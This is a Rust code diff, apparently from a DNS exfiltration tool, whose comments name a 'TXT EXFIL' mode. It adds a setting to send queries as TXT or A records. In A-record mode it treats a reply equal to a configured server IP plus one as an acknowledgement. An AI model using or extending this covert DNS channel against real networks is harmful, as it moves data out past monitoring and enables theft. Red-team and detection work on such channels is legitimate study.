@@ -144,8 +144,14 @@ impl DnsTransmitter {
         msg.set_message_type(MessageType::Query);
         msg.set_op_code(OpCode::Query);
         msg.set_recursion_desired(true);
-        // TXT EXFIL: Use TXT records instead of A records for acknowledgment
-        msg.add_query(Query::query(name.clone(), RecordType::TXT));
+
+        // Choose record type based on configuration
+        let record_type = if self.cfg.use_txt_records {
+            RecordType::TXT
+        } else {
+            RecordType::A
+        };
+        msg.add_query(Query::query(name.clone(), record_type));
 
         let mut buf = Vec::with_capacity(512);
         let mut encoder = BinEncoder::new(&mut buf);
@@ -159,23 +165,46 @@ impl DnsTransmitter {
         let (size, _) = socket.recv_from(&mut resp_buf)?;
         let resp = Message::from_vec(&resp_buf[..size])?;
 
-        // TXT EXFIL: Check for "ACK" text in TXT response
-        let ack = resp
-            .answers()
-            .iter()
-            .find_map(|record| match record.data() {
-                Some(RData::TXT(txt)) => {
-                    let txt_data: String = txt.iter()
-                        .map(|s| String::from_utf8_lossy(s).into_owned())
-                        .collect();
-                    if txt_data == "ACK" {
-                        Some(true)
-                    } else {
-                        None
+        // Check for ACK based on record type
+        let ack = if self.cfg.use_txt_records {
+            // TXT mode: Check for "ACK" text in TXT response
+            resp.answers()
+                .iter()
+                .find_map(|record| match record.data() {
+                    Some(RData::TXT(txt)) => {
+                        let txt_data: String = txt.iter()
+                            .map(|s| String::from_utf8_lossy(s).into_owned())
+                            .collect();
+                        if txt_data == "ACK" {
+                            Some(true)
+                        } else {
+                            None
+                        }
                     }
-                }
-                _ => None,
-            });
+                    _ => None,
+                })
+        } else {
+            // A record mode: ACK is server IP + 1
+            resp.answers()
+                .iter()
+                .find_map(|record| match record.data() {
+                    Some(RData::A(addr)) => {
+                        let resp_ipv4: Ipv4Addr = (*addr).into();
+                        let resp_ip: u32 = resp_ipv4.into();
+                        // Check if response IP is any server IP + 1
+                        let is_ack = self.cfg.server_ips.iter().any(|s| {
+                            if let Ok(server_ip) = s.parse::<Ipv4Addr>() {
+                                let server_ip_u32: u32 = server_ip.into();
+                                resp_ip == server_ip_u32.wrapping_add(1)
+                            } else {
+                                false
+                            }
+                        });
+                        if is_ack { Some(true) } else { None }
+                    }
+                    _ => None,
+                })
+        };
 
         Ok(ack.unwrap_or(false))
     }
